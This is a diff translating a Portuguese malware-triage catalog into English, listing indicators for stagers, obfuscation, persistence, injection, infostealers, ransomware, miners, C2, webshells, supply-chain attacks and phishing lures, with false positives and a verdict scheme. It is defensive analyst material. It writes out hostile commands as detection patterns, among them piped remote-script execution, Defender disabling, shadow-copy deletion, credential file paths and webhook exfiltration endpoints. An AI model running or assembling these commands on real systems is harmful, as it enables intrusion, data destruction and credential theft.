@@ -1,100 +1,100 @@
-# Catálogo de Padrões Suspeitos
+# Catalog of Suspicious Patterns
 
-Cada padrão traz o que significa e o **falso positivo** correspondente. Um indicador
-isolado quase nunca fecha veredito — o que fecha é a **combinação**.
+Each pattern comes with what it means and the corresponding **false positive**. An isolated
+indicator almost never closes a verdict — what closes it is the **combination**.
 
 ---
 
 ## Download-and-execute (stager)
 
-| Padrão | Onde |
+| Pattern | Where |
 |---|---|
 | `IEX (New-Object Net.WebClient).DownloadString('http://...')` | PowerShell |
 | `iwr <url> \| iex` / `irm <url> \| iex` | PowerShell |
 | `curl -s <url> \| bash` / `wget -qO- <url> \| sh` | Shell |
-| `certutil -urlcache -split -f <url> <out>` | LOLBin de download |
-| `bitsadmin /transfer` | LOLBin de download |
-| `mshta http://...` / `regsvr32 /i:http://... scrobj.dll` | LOLBin execução remota |
-| `URLDownloadToFile` | API Win32 em binário |
+| `certutil -urlcache -split -f <url> <out>` | Download LOLBin |
+| `bitsadmin /transfer` | Download LOLBin |
+| `mshta http://...` / `regsvr32 /i:http://... scrobj.dll` | Remote-execution LOLBin |
+| `URLDownloadToFile` | Win32 API in a binary |
 
-**Falso positivo:** instaladores oficiais usam `curl | bash` (rustup, nvm, Docker). O que
-diferencia é o **domínio** e o contexto. `curl https://sh.rustup.rs | sh` é legítimo;
-`curl http://185.x.x.x:8080/a | sh` não é.
-
----
-
-## Ofuscação e codificação
-
-| Padrão | Significa |
-|---|---|
-| `powershell -enc` / `-EncodedCommand` | Comando base64 UTF-16LE escondido |
-| `-w hidden -nop -ep bypass -noni` | Sem janela, sem perfil, sem política, não-interativo |
-| `FromBase64String`, `atob(`, `Buffer.from(x,'base64')` | Payload codificado |
-| `[char]0x41 + [char]0x42` / `-join` de array de int | String montada byte a byte |
-| `String.fromCharCode(...)` | Idem, em JS |
-| `\x41\x42\x43` extenso em script | Hex escape |
-| Linha única > 1000 caracteres em `.js`/`.py`/`.sh` | Payload inline |
-| Variáveis `_0x4f2a` (hex names) | Saída de javascript-obfuscator |
-| `${env:COmSPec}[4,15,25]-join''` | Montagem de string a partir de env var |
-
-**Falso positivo:** minificação e bundling (webpack, terser) produzem linhas gigantes e
-nomes curtos legitimamente. Diferença: bundle minificado tem estrutura reconhecível e
-não decodifica pra comando de sistema. **Sempre decodifique antes de julgar.**
+**False positive:** official installers use `curl | bash` (rustup, nvm, Docker). What
+differentiates them is the **domain** and the context. `curl https://sh.rustup.rs | sh` is legitimate;
+`curl http://185.x.x.x:8080/a | sh` is not.
 
 ---
 
-## Persistência (Windows)
+## Obfuscation and encoding
 
-| Padrão | Mecanismo |
+| Pattern | Means |
 |---|---|
-| `reg add HKCU\...\CurrentVersion\Run` | Autorun no login |
-| `schtasks /create /sc onlogon /ru SYSTEM` | Tarefa agendada |
-| `New-Service` / `sc create` com binário em AppData | Serviço |
-| `.lnk` na pasta Startup | Autorun clássico |
-| `__EventFilter` + `CommandLineEventConsumer` (WMI) | Persistência fileless |
-| `Image File Execution Options` + `Debugger` | Hijack de processo |
-| Modificação de `Winlogon\Shell` ou `Userinit` | Persistência de sessão |
-| DLL search order hijacking (DLL ao lado do exe) | Sequestro de carregamento |
+| `powershell -enc` / `-EncodedCommand` | Hidden base64 UTF-16LE command |
+| `-w hidden -nop -ep bypass -noni` | No window, no profile, no policy, non-interactive |
+| `FromBase64String`, `atob(`, `Buffer.from(x,'base64')` | Encoded payload |
+| `[char]0x41 + [char]0x42` / `-join` of an int array | String assembled byte by byte |
+| `String.fromCharCode(...)` | Same, in JS |
+| Long `\x41\x42\x43` runs in a script | Hex escape |
+| Single line > 1000 characters in `.js`/`.py`/`.sh` | Inline payload |
+| `_0x4f2a` variables (hex names) | javascript-obfuscator output |
+| `${env:COmSPec}[4,15,25]-join''` | String assembled from an env var |
 
-## Persistência (Linux)
-
-`crontab -e`, `/etc/cron.d/*`, `~/.bashrc`/`~/.profile`, unit em `/etc/systemd/system/`,
-`~/.ssh/authorized_keys`, `LD_PRELOAD` em `/etc/ld.so.preload`, `@reboot` no cron.
+**False positive:** minification and bundling (webpack, terser) legitimately produce huge lines
+and short names. The difference: a minified bundle has a recognizable structure and does not
+decode into a system command. **Always decode before judging.**
 
 ---
 
-## Injeção de processo e evasão
+## Persistence (Windows)
 
-| Padrão | Significa |
+| Pattern | Mechanism |
 |---|---|
-| `VirtualAlloc` + `WriteProcessMemory` + `CreateRemoteThread` | Injeção clássica |
+| `reg add HKCU\...\CurrentVersion\Run` | Autorun at login |
+| `schtasks /create /sc onlogon /ru SYSTEM` | Scheduled task |
+| `New-Service` / `sc create` with a binary in AppData | Service |
+| `.lnk` in the Startup folder | Classic autorun |
+| `__EventFilter` + `CommandLineEventConsumer` (WMI) | Fileless persistence |
+| `Image File Execution Options` + `Debugger` | Process hijack |
+| Modification of `Winlogon\Shell` or `Userinit` | Session persistence |
+| DLL search order hijacking (DLL next to the exe) | Load hijacking |
+
+## Persistence (Linux)
+
+`crontab -e`, `/etc/cron.d/*`, `~/.bashrc`/`~/.profile`, unit in `/etc/systemd/system/`,
+`~/.ssh/authorized_keys`, `LD_PRELOAD` in `/etc/ld.so.preload`, `@reboot` in cron.
+
+---
+
+## Process injection and evasion
+
+| Pattern | Means |
+|---|---|
+| `VirtualAlloc` + `WriteProcessMemory` + `CreateRemoteThread` | Classic injection |
 | `NtUnmapViewOfSection` + `SetThreadContext` | Process hollowing |
 | `QueueUserAPC` | APC injection |
-| `Add-MpPreference -ExclusionPath/-ExclusionProcess` | Cegando o Defender |
-| `Set-MpPreference -DisableRealtimeMonitoring $true` | Desligando o Defender |
-| `netsh advfirewall firewall add rule` | Abrindo caminho pro C2 |
-| `amsi` / `AmsiScanBuffer` em string | Tentativa de bypass de AMSI |
-| `IsDebuggerPresent`, `CheckRemoteDebuggerPresent`, `GetTickCount` em loop | Anti-análise |
-| Verificação de VM (`VMware`, `VBox`, `QEMU` em strings) | Anti-sandbox |
-| `Sleep(600000)` no início | Timeout de sandbox |
+| `Add-MpPreference -ExclusionPath/-ExclusionProcess` | Blinding Defender |
+| `Set-MpPreference -DisableRealtimeMonitoring $true` | Turning Defender off |
+| `netsh advfirewall firewall add rule` | Opening a path for the C2 |
+| `amsi` / `AmsiScanBuffer` in strings | AMSI bypass attempt |
+| `IsDebuggerPresent`, `CheckRemoteDebuggerPresent`, `GetTickCount` in a loop | Anti-analysis |
+| VM checks (`VMware`, `VBox`, `QEMU` in strings) | Anti-sandbox |
+| `Sleep(600000)` at startup | Sandbox timeout |
 
-**Falso positivo:** `VirtualAlloc` sozinho aparece em qualquer runtime, JIT, packer ou
-debugger legítimo. O que conta é o trio completo + destino do buffer.
+**False positive:** `VirtualAlloc` alone shows up in any legitimate runtime, JIT, packer or
+debugger. What counts is the full trio + the buffer's destination.
 
 ---
 
-## Roubo de credencial (infostealer)
+## Credential theft (infostealer)
 
-Caminhos e nomes que aparecem em strings:
+Paths and names that show up in strings:
 - `Login Data`, `Local State`, `Web Data`, `Cookies` (Chromium)
 - `logins.json`, `key4.db`, `cert9.db` (Firefox)
 - `wallet.dat`, `keystore`, `UTC--`, `MetaMask`, `Exodus`, `Electrum`
 - `\.ssh\id_rsa`, `.aws\credentials`, `.docker\config.json`, `.npmrc`, `.git-credentials`
-- `%APPDATA%\discord\Local Storage\leveldb` (token do Discord)
+- `%APPDATA%\discord\Local Storage\leveldb` (Discord token)
 - `Telegram Desktop\tdata`
 - `.env`, `credentials.json`, `secrets.yaml`
 
-Combinação de vários desses + rotina de compactação + POST HTTP = **infostealer confirmado**.
+A combination of several of these + a compression routine + an HTTP POST = **confirmed infostealer**.
 
 ---
 
@@ -103,91 +103,91 @@ Combinação de vários desses + rotina de compactação + POST HTTP = **infoste
 `vssadmin delete shadows /all /quiet`, `wmic shadowcopy delete`,
 `bcdedit /set recoveryenabled No`, `bcdedit /set bootstatuspolicy ignoreallfailures`,
 `wbadmin delete catalog`, `CryptEncrypt`/`CryptGenKey`, `BCryptEncrypt`,
-extensão nova em massa, arquivo `README_TO_DECRYPT.txt`/`HOW_TO_RECOVER`, enumeração de
-drives de rede, `taskkill` em processos de banco (sqlservr, oracle) e de backup.
+new extension applied en masse, `README_TO_DECRYPT.txt`/`HOW_TO_RECOVER` file, enumeration of
+network drives, `taskkill` on database (sqlservr, oracle) and backup processes.
 
 ---
 
 ## Cryptominer
 
-Strings de pool: `stratum+tcp://`, `pool.`, `xmrig`, `nanopool`, `f2pool`, `nicehash`,
-`--donate-level`, `randomx`, endereço de carteira Monero (começa com `4` ou `8`, 95 chars).
-Sintoma: CPU/GPU em 100% constante, processo com nome de sistema em caminho errado
-(`C:\Windows\Temp\svchost.exe`), throttle quando o Gerenciador de Tarefas abre.
+Pool strings: `stratum+tcp://`, `pool.`, `xmrig`, `nanopool`, `f2pool`, `nicehash`,
+`--donate-level`, `randomx`, Monero wallet address (starts with `4` or `8`, 95 chars).
+Symptom: CPU/GPU constantly at 100%, process with a system name in the wrong path
+(`C:\Windows\Temp\svchost.exe`), throttling when Task Manager opens.
 
-**PUA:** miner instalado pelo próprio usuário é PUA, não malware — mas em máquina
-corporativa continua sendo violação de política.
+**PUA:** a miner installed by the user themselves is PUA, not malware — but on a corporate
+machine it is still a policy violation.
 
 ---
 
 ## C2 (command and control)
 
-- IP cru em porta alta não padrão (`:4444`, `:8080`, `:1337`, `:5555`)
-- Domínio dinâmico: `*.duckdns.org`, `*.no-ip.org`, `*.ngrok-free.app`, `*.serveo.net`
-- Webhook do Discord (`discord.com/api/webhooks/...`) ou Bot API do Telegram
-  (`api.telegram.org/bot<token>/sendDocument`) — exfiltração barata, muito comum
-- Pastebin/GitHub Gist raw como fonte de configuração ou estágio 2
+- Raw IP on a non-standard high port (`:4444`, `:8080`, `:1337`, `:5555`)
+- Dynamic domain: `*.duckdns.org`, `*.no-ip.org`, `*.ngrok-free.app`, `*.serveo.net`
+- Discord webhook (`discord.com/api/webhooks/...`) or Telegram Bot API
+  (`api.telegram.org/bot<token>/sendDocument`) — cheap exfiltration, very common
+- Pastebin/GitHub Gist raw as a configuration source or stage 2
 - `.onion` (Tor)
-- Beaconing: requisições em intervalo regular (ex.: exatos 60s) pro mesmo host
-- DGA: muitos domínios de aparência aleatória (`kjhwqoiuh.top`)
-- DNS tunneling: consultas TXT longas e frequentes pro mesmo domínio
+- Beaconing: requests at a regular interval (e.g. exactly 60s) to the same host
+- DGA: many random-looking domains (`kjhwqoiuh.top`)
+- DNS tunneling: long, frequent TXT queries to the same domain
 
 ---
 
-## Webshell (encontrado em servidor web)
+## Webshell (found on a web server)
 
 ```bash
 grep -rnE 'eval\(\$_(POST|GET|REQUEST|COOKIE)|assert\(\$_|preg_replace\(.*/e|base64_decode\(\$_|shell_exec|passthru\(|system\(\$_|`\$_' /var/www --include='*.php' | head -30
 find /var/www -name '*.php' -mmin -10080 -ls
 ```
 
-Sinais: PHP num diretório de uploads/imagens, arquivo com nome aleatório
-(`x7f3.php`), arquivo `.php` com timestamp destoante dos vizinhos, `.jpg` que o `file`
-identifica como PHP, one-liner denso no fim de um arquivo legítimo (backdoor anexado).
+Signals: PHP in an uploads/images directory, a file with a random name
+(`x7f3.php`), a `.php` file whose timestamp stands out from its neighbors, a `.jpg` that `file`
+identifies as PHP, a dense one-liner at the end of a legitimate file (appended backdoor).
 
 ---
 
 ## Supply chain (npm/pip)
 
-- `postinstall`/`preinstall`/`prepare` executando `node -e`, `curl`, `python -c`, base64
-- Pacote publicado dias atrás com pico de download
+- `postinstall`/`preinstall`/`prepare` running `node -e`, `curl`, `python -c`, base64
+- Package published days ago with a download spike
 - Typosquatting: `crossenv`/`cross-env`, `python-dateutil`/`dateutil`, `requests`/`request`
-- Mantenedor novo publicando após transferência de propriedade
-- Release no registry sem commit correspondente no repositório
-- Dependência no lockfile ausente do manifesto (dependency confusion)
-- Leitura de `process.env` inteiro seguida de POST — exfiltração de segredo de CI
-- Binário `.node`/`.so`/`.pyd` sem fonte correspondente
+- New maintainer publishing after an ownership transfer
+- Release on the registry without a corresponding commit in the repository
+- Dependency in the lockfile missing from the manifest (dependency confusion)
+- Reading the entire `process.env` followed by a POST — CI secret exfiltration
+- `.node`/`.so`/`.pyd` binary without corresponding source
 
 ---
 
-## Isca de engenharia social (o vetor, não o payload)
+## Social engineering lure (the vector, not the payload)
 
-- Extensão dupla: `orcamento.pdf.exe`, `nota_fiscal.docx.scr`
-- Caractere RLO U+202E no nome invertendo a exibição
-- ZIP com senha, senha no corpo do e-mail (evasão de gateway)
-- `.iso`/`.img`/`.vhd` anexado (burla a marca MOTW)
-- `.lnk` disfarçado de documento
-- "Habilite a edição/conteúdo para visualizar"
-- **"Cole este comando no Win+R / PowerShell para verificar que você é humano"** —
-  ClickFix/fake CAPTCHA. Nenhum site legítimo pede isso. Nunca.
-- Urgência + autoridade: "seu acesso expira hoje", "departamento jurídico", "boleto vencendo"
-- Remetente com domínio parecido com o do fornecedor real (fraude de boleto/PIX)
+- Double extension: `quote.pdf.exe`, `invoice.docx.scr`
+- RLO character U+202E in the name reversing the display
+- Password-protected ZIP with the password in the e-mail body (gateway evasion)
+- `.iso`/`.img`/`.vhd` attachment (bypasses the MOTW mark)
+- `.lnk` disguised as a document
+- "Enable editing/content to view"
+- **"Paste this command into Win+R / PowerShell to verify you are human"** —
+  ClickFix/fake CAPTCHA. No legitimate site asks for this. Ever.
+- Urgency + authority: "your access expires today", "legal department", "overdue payment"
+- Sender with a domain resembling the real vendor's (invoice/bank-transfer fraud)
 
 ---
 
-## Como combinar
+## How to combine
 
-Um indicador = investigar. Combinação = veredito.
+One indicator = investigate. Combination = verdict.
 
-**MALICIOUS com alta confiança:**
-download remoto + execução dinâmica + persistência + evasão de AV.
+**MALICIOUS with high confidence:**
+remote download + dynamic execution + persistence + AV evasion.
 
 **SUSPICIOUS:**
-ofuscação pesada sem justificativa + acesso à rede, mas sem payload decodificado.
+heavy obfuscation without justification + network access, but no decoded payload.
 
 **UNKNOWN:**
-blob que não foi possível decodificar com as ferramentas disponíveis. Diga o que falta
-em vez de chutar.
+blob that could not be decoded with the available tools. Say what is missing
+instead of guessing.
 
 **CLEAN:**
-nada encontrado **no escopo analisado** — sempre declare qual foi o escopo.
+nothing found **within the analyzed scope** — always state what the scope was.
